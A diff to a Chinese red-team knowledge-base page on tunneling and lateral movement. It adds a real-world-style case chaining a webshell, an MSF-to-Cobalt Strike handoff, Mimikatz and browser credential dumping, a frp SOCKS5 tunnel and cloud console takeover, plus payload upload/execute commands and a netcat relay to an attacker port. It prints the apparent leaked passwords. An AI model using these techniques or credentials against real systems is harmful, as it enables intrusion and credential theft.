@@ -2,8 +2,8 @@
 title: 内网穿透与横向移动核心技术体系
 description: 系统梳理渗透测试中内网穿透/横向移动核心技术体系：对比 Venom、Frp、SSH 隧道、Meterpreter 路由、Cobalt Strike
   SMB Beacon、iox 等主流工具建立 SOCKS/HTTP 代理的原理与配置实战，补充 ptunnel ICMP隧道、lcx/Portmap端口转发、Netcat多向连接反弹Shell、DNS隧道配合Cobalt
-  Strike上线等实战隧道技术细节，结合 Proxychains/Proxytool 工具链实现全工具代理化，重点解析 iox 作为具备加密握手、随机 Padding、协议栈可重构的流量对抗型代理工具的实战参考，附
-  VulnHub Social Network、CTFd-Whale、GKCTF2021 hackme 等实战场景交叉引用。
+  Strike上线等实战隧道技术细节，结合 Proxychains/Proxytool 工具链实现全工具代理化，重点解析 iox 作为具备加密握手、随机 Padding、协议栈可重构的流量对抗型代理工具的实战参考，附上市公司渗透案例、VulnHub
+  Social Network、CTFd-Whale、GKCTF2021 hackme 等实战场景交叉引用。
 category: program-analysis
 tags:
 - 内网穿透
@@ -38,6 +38,9 @@ tags:
 - 协议栈重构
 - 随机Padding
 - 加密握手
+- 会话跨C2传递
+- 凭证复用
+- 上市公司渗透案例
 date: 2024-01-15
 updated: '2026-11-15'
 ---
@@ -487,7 +490,48 @@ proxychains -f /custom/proxychains.conf <cmd>
 
 ## 实战场景交叉引用
 
-### 场景一：VulnHub Social Network（Venom + Proxychains 完整复现）
+### 场景一：上市公司渗透测试实战（frp 隧道落地 + 凭证复用横向 + 会话跨 C2 传递）
+
+> **来源**：0x6270 网络空间安全学院知识星球成员「小黑」实战复盘，原文见微信公众号归档。
+
+**完整攻击链复现**：
+
+```mermaid
+flowchart LR
+    A[文件上传漏洞] --> B[哥斯拉 WebShell]
+    B --> C[MSF 反弹会话]
+    C --> D[MSF → CS 会话传递]
+    D --> E[CS Beacon 上线]
+    E --> F[提权 + Mimikatz 抓取凭证]
+    F --> G[Administrator / ris.jmjt123]
+    G --> H[frp 反向 SOCKS5 穿透]
+    H --> I[Proxychains + 内网工具]
+    I --> J[MSSQL 横向移动]
+    J --> K[浏览器凭证复用]
+    K --> L[云管理后台接管]
+```
+
+#### 关键技术节点详解
+
+| 阶段 | 技术动作 | 工具/命令 | 实战细节 |
+|------|----------|-----------|----------|
+| **入口** | 文件上传绕过 → Godzilla | 哥斯拉 Java/PHP 动态密钥 | 利用上传点绕过前端/后端校验，落地 JSP/ASPX/Shell |
+| **C2 对接** | Godzilla → MSF | `msfvenom` 生成 Payload，MSF `exploit/multi/handler` | Godzilla 内置 MSF 隧道功能或手工上传 `meterpreter` |
+| **会话跨框架传递** | **MSF → CS** | CS 创建监听器 → MSF `sessions -u` 或手工生成 Raw Payload | 详见下文「CS & MSF 会话移交」标准化流程 |
+| **权限提升与凭证** | 提权 → 导出明文/哈希 | `getsystem` + `mimikatz` / `sekurlsa::logonpasswords` | 获得 `Administrator:ris.jmjt123`，为后续横向奠基 |
+| **内网穿透** | **frp 部署 SOCKS5** | `frpc.ini: plugin=socks5` + 服务端 `frps` | 跳板机反连攻击机 frps，攻击机得 1080 SOCKS5 入口 |
+| **全工具代理化** | **Proxychains** | `/etc/proxychains4.conf → socks5 127.0.0.1 1080` | Nmap、SQLMap、Impacket、RDP 客户端统一走代理 |
+| **横向移动·数据库** | **MSSQL 信任利用** | `mssqlclient.py` / `xp_cmdshell` / `sp_start_job` | 利用 SA/高权限账号执行命令、抓哈希、再横向 |
+| **凭证复用·浏览器** | **Chrome/Edge 密码库** | `mimikatz dpapi::chrome` / `SharpDPAPI` / `LaZagne` | 提取 `admin/admin123` 登录云渠商应用系统 |
+| **目标达成** | 云管理后台接管 | 浏览器复用 Cookie/Session 或直接登录 | 云主机渗透到此结束，形成完整闭环 |
+
+> **实战启示**：
+> 1. **会话传递是红队标配**——MSF 丰富模块库 + CS 图形化横向，互补而非替代
+> 2. **frp SOCKS5 + Proxychains 是「最小可行隧道组合」**——部署快、依赖少、兼容性强
+> 3. **凭证复用不止 PTH**——浏览器保存密码、DPAPI、云控制台 Token 均为高价值目标
+> 4. **云边界即新内网**——跳板机若为云主机，其元数据服务、IAM 角色、控制台凭证均成横向面
+
+### 场景二：VulnHub Social Network（Venom + Proxychains 完整复现）
 
 详见 [[vulnhub-boredhackerblog-social-network-writeup]]。
 
@@ -500,19 +544,19 @@ proxychains -f /custom/proxychains.conf <cmd>
 6. 密码哈希破解 → SSH 横向登录宿主
 7. **本地提权 (CVE-2013-2094)** → Root
 
-### 场景二：CTFd-Whale 动态靶机集群（Frp 多级级联）
+### 场景三：CTFd-Whale 动态靶机集群（Frp 多级级联）
 
 参见 [[frp内网渗透应用]]。
 
-### 场景三：Cobalt Strike SMB Beacon 域环境横向
+### 场景四：Cobalt Strike SMB Beacon 域环境横向
 
 参见 [[cobalt-strike-external-c2-smb-beacon]]、[[smb-named-pipe-c2-communication]]。
 
-### 场景四：GKCTF2021 hackme - Frp 代理内网 WebLogic + CVE-2020-14882
+### 场景五：GKCTF2021 hackme - Frp 代理内网 WebLogic + CVE-2020-14882
 
 详见 [[gkctf-2021-web-writeup]]。
 
-### 场景五：iox 实战部署建议
+### 场景六：iox 实战部署建议
 
 在需要**长期驻留、高隐蔽性**的红队行动中，建议：
 1. **首选 iox 加密多路复用模式** 作为主要隧道通道
@@ -522,7 +566,7 @@ proxychains -f /custom/proxychains.conf <cmd>
 
 ---
 
-## CS & MSF 会话移交（Day72 实战）
+## CS & MSF 会话移交（Day72 实战 + 上市公司案例实证）
 
 ### CS → MSF（Spawn 会话）
 
@@ -538,9 +582,9 @@ proxychains -f /custom/proxychains.conf <cmd>
 3. **CS 目标会话右键 → Spawn → 选择该监听器**
 4. **MSF 获得 Meterpreter 会话**
 
-### MSF → CS（手动生成 Payload 回连）
+### MSF → CS（手动生成 Payload 回连）——**上市公司案例采用方式**
 
-1. **CS 创建监听器**（记录 Host/Port）
+1. **CS 创建监听器**（记录 Host/Port，如 `HTTP/HTTPS`、`Host: teamserver_ip`、`Port: 80/443`）
 2. **MSF 会话中执行**：
    ```msf
    # 生成 CS 兼容的 Raw Payload
@@ -550,9 +594,17 @@ proxychains -f /custom/proxychains.conf <cmd>
    generate -f raw -o /tmp/cs.bin
    ```
 3. **上传执行或通过 `execute -f` 落地运行**
+   ```msf
+   # 落地执行（易被 AV 查杀）
+   upload /tmp/cs.bin C:\\Windows\\Temp\\cs.bin
+   execute -f C:\\Windows\\Temp\\cs.bin
+   
+   # 或内存执行（推荐，配合 BOF/Reflective Loader）
+   # 需 MSF 安装 `post/windows/manage/reflective_dll_inject` 等模块
+   ```
 4. **CS 获得 Beacon 会话**
 
-**双向移交意义**：结合 CS 图形化横向、MSF 丰富模块库，实现**工具链互补**。
+**双向移交意义**：结合 CS 图形化横向、MSF 丰富模块库，实现**工具链互补**。上市公司案例中即采用 **MSF → CS** 方向，利用 Godzilla 上线 MSF 后，再将会话「升级」为 CS Beacon 以便后续内网横向操作。
 
 ---
 
@@ -647,10 +699,11 @@ graph TD
     G --> G4[协议栈重构解决smux泄露]
     
     A --> H[实战场景]
-    H --> H1[[vulnhub-boredhackerblog-social-network-writeup]]
-    H --> H2[[frp内网渗透应用]]
-    H --> H3[[cobalt-strike-external-c2-smb-beacon]]
-    H --> H4[[gkctf-2021-web-writeup]]
+    H --> H1[上市公司渗透案例]
+    H --> H2[[vulnhub-boredhackerblog-social-network-writeup]]
+    H --> H3[[frp内网渗透应用]]
+    H --> H4[[cobalt-strike-external-c2-smb-beacon]]
+    H --> H5[[gkctf-2021-web-writeup]]
     
     A --> I[检测对抗]
     I --> I1[[named-pipe-smb-detection-sysmon]]
@@ -679,6 +732,8 @@ graph TD
 | **多跳板 Shell 反弹** | Netcat 管道转发 | socat / SSH 跳板 | `nc <target> <port> \| nc <attacker> 4444` |
 | **CS ↔ MSF 会话移交** | CS Spawn / MSF generate raw | 手动上传执行 Payload | CS Listener → MSF handler → Spawn |
 | **高隐蔽长期驻留隧道** | **iox 加密多路复用** (`sx@`/`cx@`) | Venom WSS / Frp KCP | `iox proxy sx@tcp:127.0.0.1:9999 -k <32字符强随机键>` |
+| **frp 落地实战** | **上市公司案例**：跳板机反连 frps → 攻击机得 SOCKS5 | CTFd-Whale 多级级联 | `frpc.ini: plugin=socks5` + `proxychains` 全链路代理 |
+| **凭证复用横向** | **上市公司案例**：浏览器 DPAPI → 云控制台 | PTH/PTK/PTT/Kerberoasting | `SharpDPAPI` / `LaZagne` → 云厂商控制台复用 |
 
 ---
 
@@ -725,3 +780,4 @@ graph TD
 - [0x00实验室-202108-202304_067](../sources/0x00实验室-202108-202304_067.md)
 - [0x00实验室-202108-202304_104](../sources/0x00实验室-202108-202304_104.md)
 - [0x4d5a-202103-202209_12](../sources/0x4d5a-202103-202209_12.md)
+- [0x6270安全团队-202203-202304_38](../sources/0x6270安全团队-202203-202304_38.md)
